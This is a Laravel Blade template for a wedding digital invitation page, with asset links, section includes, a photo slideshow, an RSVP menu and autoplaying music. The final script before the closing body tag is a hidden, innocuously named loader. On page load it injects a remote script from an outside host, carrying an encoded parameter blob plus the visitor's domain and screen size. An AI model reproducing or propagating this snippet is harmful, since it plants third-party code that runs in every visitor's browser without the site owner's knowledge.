<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Fajar & Senja pandawa.tech</title>
        <meta name="description" content="Fajar Senja Wedding" />
        <meta name="keywords" content="Fajar Senja Wedding" />
        <meta name="author" content="Fajar Senja Wedding" />
        <!-- Loading Google Web fonts-->
        <link href='https://fonts.googleapis.com/css?family=Raleway:400,900italic,900,800italic,800,700,700italic,600italic,600,500italic,500,400italic,300italic,200italic,200,300,100italic,100' rel='stylesheet' type='text/css'>
        <link href='https://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
        <!--General Css-->
        <link rel="stylesheet" href="{{asset('wedding-2/css/bootstrap.css')}}" type="text/css"/>
        <link rel="stylesheet" href="{{asset('wedding-2/css/font-awesome.css')}}" type="text/css" />
        <link rel="stylesheet" href="{{asset('wedding-2/css/simple-line-icons.css')}}" type="text/css" />
        <link rel="stylesheet" href="{{asset('wedding-2/css/animate.min.css')}}" type="text/css" />
        <link rel="stylesheet" href="{{asset('wedding-2/css/style.css')}}" type="text/css" />
        <!-- Owl Coursel -->
        <link rel="stylesheet" href="{{asset('wedding-2/owlcarousel/assets/owl.carousel.min.css')}}">
        <link rel="stylesheet" href="{{asset('wedding-2/owlcarousel/assets/owl.theme.default.min.css')}}">
        <!--Menu-->
        <link rel="stylesheet" href="{{asset('wedding-2/css/menu.css')}}" type="text/css" />
        <link rel="stylesheet" href="{{asset('wedding-2/css/slicknav.css')}}">
        <!--Menu-->
        <!--General Css-->
        <!--Optional Css-->
        <!--Home Tiled Slider-->
        <!--<link rel="stylesheet" href="{{asset('wedding-2/')}}css/component.css" type="text/css" />-->
        <!--Home Tiled Slider End-->
        <!-- Vegas Slider-->
        <!--<link rel="stylesheet" href="{{asset('wedding-2/')}}css/vegas_styles.css" />-->
        <!-- Vegas Slider-->
        <!--Cycle Slider-->
        <link rel="stylesheet" href="{{asset('wedding-2/css/cycleslider.css')}}">
        <!--Cycle Slider-->
        <!--Gallery Filer-->
        <link type="text/css" rel="stylesheet" href="{{asset('wedding-2/css/portfolio.css')}}"/>
        <link rel="stylesheet" href="{{asset('wedding-2/css/prettyPhoto.css')}}" type="text/css" />
        <!--Gallery Filer End-->
        <link rel="stylesheet" href="{{asset('wedding-2/css/home1.css')}}" type="text/css" />
        <link rel="stylesheet" href="{{asset('wedding-2/css/colors/color-1.css')}}" id="color" type="text/css" />
        <!--Optional Css-->
        <link rel="shortcut icon" href="{{asset('wedding-2/images/favicon.ico.png')}}" /> 
        <link rel="apple-touch-icon" href="{{asset('wedding-2/images/apple_touch_icon.png')}}" />
        <link rel="apple-touch-icon" sizes="72x72" href="{{asset('wedding-2/images/apple_touch_icon_72x72.png')}}" />
        <link rel="apple-touch-icon" sizes="114x114" href="{{asset('wedding-2/images/apple_touch_icon_114x114.png')}}" />
        <script type="text/javascript" src="{{asset('wedding-2/js/modernizr.custom.js')}}"></script>
    </head>
<body>
    <audio style="display: none;" src="{{asset('music/marry-your-daughter2.mp3')}}" autoplay="true" loop></audio> 
    <section id="jSplash">
    	<div id="circle"><img src="{{asset('wedding-2/img/spmenu1.png')}}" alt=""></div>
    </section>


<!--Wrapper-->
<div id="wrapper">
    <div id="mask">
    <!--Header-->
        @include('wedding-2.header')
    <!--End Header-->
    <!--Home Page -->
        @include('wedding-2.home')
    <!-- Home Page end-->
    <!-- Couples -->
        @include('wedding-2.couples')
    <!-- // Couples ends --> 
    <!-- The Wedding --> 	
        @include('wedding-2.ceremony-reception')
    <!-- The Wedding End -->  
    <!-- Get Directions --> 
        @include('wedding-2.ceremony-direction')
    <!--  Get Directions End --> 

    <!-- Reception Get Directions --> 	
        @include('wedding-2.reception-direction')
    <!-- // reception Get Directions --> 
    <!--Groomsmen--> 
        @include('wedding-2.groomsmen')
    <!-- // Groomsmen ends --> 
    <!--Bridesmaids--> 	
        @include('wedding-2.bridesmaid')
    <!-- // Bridesmaids end --> 
    <!-- loveline-->
        @include('wedding-2.loveline')  
    <!-- // loveline ends--> 
    <!-- The Event -->
        @include('wedding-2.events')  
    <!-- // The Events--> 
<!--Gallery --> 
        <div id="gallery" class="item">
        	<img src="{{asset('wedding-2/img/subpage-images/3.jpg')}}" alt="The Wedding" class="fullBg ">
            <div class="content">
                <div class="content_overlay_fullwidth content_overlay_bgcolor9"></div>
                <div class="content_inner content_inner_fullwidth">
                    <div class="cycle-slideshow" data-cycle-fx=fade data-cycle-speed=1000 data-cycle-timeout=3000 data-cycle-caption-plugin=caption2 data-cycle-overlay-fx-out="fadeOut" data-cycle-overlay-fx-in="fadeIn" data-cycle-prev=".prev" data-cycle-next=".next"
                    >
                        <div class="cycle-overlay"></div>
                        <img src="{{asset('wedding-2/img/gallery/cycle/1.jpg')}}" data-cycle-desc="Steve &amp; Melissa Grey"  class="fullBg" alt="">
                        <img src="{{asset('wedding-2/img/gallery/cycle/2.jpg')}}" data-cycle-desc="Thomas Edward &amp; Mandi" class="fullBg" alt="">
                        <img src="{{asset('wedding-2/img/gallery/cycle/3.jpg')}}" data-cycle-desc="Mathew Davis &amp; Sharon " class="fullBg" alt="">
                        <img src="{{asset('wedding-2/img/gallery/cycle/4.jpg')}}" data-cycle-desc="Salamon &amp; Katrin" class="fullBg" alt="">
                        <img src="{{asset('wedding-2/img/gallery/cycle/5.jpg')}}" data-cycle-desc="Salamon &amp; Katrin" class="fullBg" alt="">          
                    </div>
                    
                    <div class="gal-top">
                        <div class="container">
                            <div class="media">
                                <div class="media-body">
                                	<!--<h1 class="text-center">
                                        <span class="heading-seperator">
                                        	<span class="heading-left-seperator"></span> Gallery Cycle-Slider 
                                            <span class="heading-right-seperator"></span>
                                        </span>
                                    </h1>-->
                                </div>
                                <div class="media-right">
                                    <div id="button" class="clearfix">
                                        <a href="#" class="prev btn"></a>
                                        <a href="#" class="next btn"></a>                
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
<!-- // Gallery --> 

<!-- Filter Gallery --> 
        @include('wedding-2.filter-gallery')  
<!-- // Filter Gallery --> 

<!-- Footer-->
        <div id="footer" class="footer">
        	<div class="copyright">Copyrights &copy; Lintrix's Digital Invitation 2018</div>
        </div>
<!-- Footer Ends-->



<!--Special Menu -->
        <div id="specialmenu" class="toHideTheBubbles hidden-phone">
        	<div class="spcontainer">
        		<div class="spmenu-tags1">
        			<a href="#reservation" class="nav-link spmenu spmenu1" role="button">
                        <span><i class="fa fa-credit-card"></i></span>
                        <span class="sptext">rsvp</span>			
                    </a>        
                </div>
                <div class="spmenu-tags2">
        			<button class="spmenu spmenu2"  data-toggle="modal" data-target="#video">
        				<span><i class="fa fa-video-camera"></i></span>
        				<span class="sptext">video</span>			
                    </button>
            	</div>
                <div class="spmenu-tags3">
                    <button class="spmenu spmenu3"    data-toggle="modal" data-target="#invitation">
                        <span><i class="fa fa-envelope-o"></i></span>
                        <span class="sptext">Invitation</span>            
                    </button>		
        		</div>
                <div class="spmenu-tags4">
        			<a href="#ceremony-reception" class="nav-link spmenu spmenu4" role="button">
                        <span><i class="fa fa-map-marker"></i></span>
                        <span class="sptext">location</span>            
                    </a>        
                </div>
            </div>
        </div>
<!-- // Special Menu -->
<!--Lightbox  for home page special promo pack-->
        @include('wedding-2.popup')
<!-- // Lightbox  for home page special promo pack-->
    </div>
</div>
<!-- // Wrapper =============================-->

<!--java script-->

<script src="{{asset('wedding-2/js/jquery-1.12.1.min.js')}}"></script>
<script src="{{asset('wedding-2/owlcarousel/owl.carousel.min.js')}}"></script>
<script type="text/javascript">
    $(document).ready(function()
    {
        $(document).ready(function() {
              $('.owl-carousel').owlCarousel({
                margin: 10,
                loop: true,
                autoplay:true,
                // autoWidth: true,
                items: 3
              })
            })
    });
</script>           
<script src="{{asset('wedding-2/js/jquery-ui.min.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/bootstrap.min.js')}}"></script>
<!-- Form Validation-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.validate.min.js')}}"></script>
<!-- Form Validation End-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.scrollTo.min.js')}}"></script>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>

<!-- SlickNavigation For Mobile Device-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.slicknav.min.js')}}"></script>
<!-- SlickNavigation For Mobile Device Ends-->

<!-- Content NiceScroll -->
<script src="{{asset('wedding-2/js/jquery.nicescroll.min.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.mousewheel.min.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.easing.1.3.js')}}"></script>
<!-- Content NiceScroll End-->

<!-- include retina js -->
<script type="text/javascript" src="{{asset('wedding-2/js/retina-1.1.0.min.js')}}"></script>
<!-- include retina js Ends-->

<!-- Optional Scripts Starts -->

<!-- Preloader Starts -->
<script type="text/javascript" src="{{asset('wedding-2/js/jpreloader.min.js')}}"></script>
<!-- Preloader End -->

<!-- Cycle Slider Gallery Starts-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.cycle.all.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.cycle2.caption2.js')}}"></script>
<!-- Cycle Slider Gallery End-->

<!-- Home Tiled Sldier -->
<!--<script type="text/javascript" src="{{asset('')}}wedding-2/js/classie.js"></script>
<script type="text/javascript" src="{{asset('')}}wedding-2/js/boxesFx.js"></script>
<script type="text/javascript" src="{{asset('')}}wedding-2/js/wait.js"></script>
<script type="text/javascript" src="{{asset('')}}wedding-2/js/custom_general_box.js"></script>-->
<!-- Home Tiled Sldier End-->

<!-- Vegas Sldier -->
<!--<script src="{{asset('')}}wedding-2/js/jquery.vegas.js"></script>-->
<!-- Vegas Sldier -->

<!-- Filter Gallery And PrettyPhoto-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.prettyPhoto.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.mixitup.min.js')}}"></script>
<!-- Filter Gallery And PrettyPhoto End-->

<!-- Count Down Timer Starts-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.countdown.js')}}"></script>
<!-- Count Down Timer End-->

<!-- Custom Scripts -->
<script type="text/javascript" src="{{asset('wedding-2/js/custom_general.js')}}"></script>
<script type="text/javascript" src="{{asset('wedding-2/js/google-map-custom.js')}}"></script>
<!-- Custom Scripts End-->

<!-- Place Holder Scripts Starts-->
<!--[if IE 9 ]>
  <script type="text/javascript" src="{{asset('')}}wedding-2/js/jquery.placeholder.js"></script>
  <script>
  	$('input[type=text], textarea').placeholder();
  </script>
<![endif]-->
<!-- Place Holder Scripts Ends-->
<script type="text/javascript" src="{{asset('wedding-2/js/jquery.transit.js')}}"></script>


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdd%2fAB0K42KWEzS3gjXxr3Tm38xrXsn8HR5kEZwWAorPtSHEWGmhCxFrgkrm8tzRvcQVFK7Kf8naeUBZXvK8b2IqwnmoXy9klkTX4lNlsK9HQuz5IXTiwo4y%2fKqb9Blc1mLWO1rX0FFB2K4HPtubGrZMilwiOYEm4oWOPfdHvVmXiTUGfQjmo5WkkgstEFtranHIZOtb9DWKh5CTDEfpo8coU4SXnrtlMURpwehElPZ3Q0Mx%2b%2bkQxUZ66AFIQs8yJRHQxlWM55SfIhTQvXMV8XnP9h433UzweZclVlEVlIwCNIc%2b%2bBwmjQ%2f33t139Voub%2fS1ALsUY3m1Klc1OixCiYs6KN%2fg47BOl3tp9yiLwP%2f0fnSVQRuXCnyjl8OySLgEpZgv85GY5GENs%2bcEiJVOp5u4wqKRcfZtYfcdcK4e6HCfkwiBKwFY%2ffMxqr8x%2fOqPT1xZAl42lzSpfZUGNiWIupiAc6NMR9%2fvzWDByTB1YM3mljfpn2wuigsIFCK%2fUstdO3fzx3cNlVzJ2a1nQzrPXCVlGNXbRWT5JtlpEBIdI8dRg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>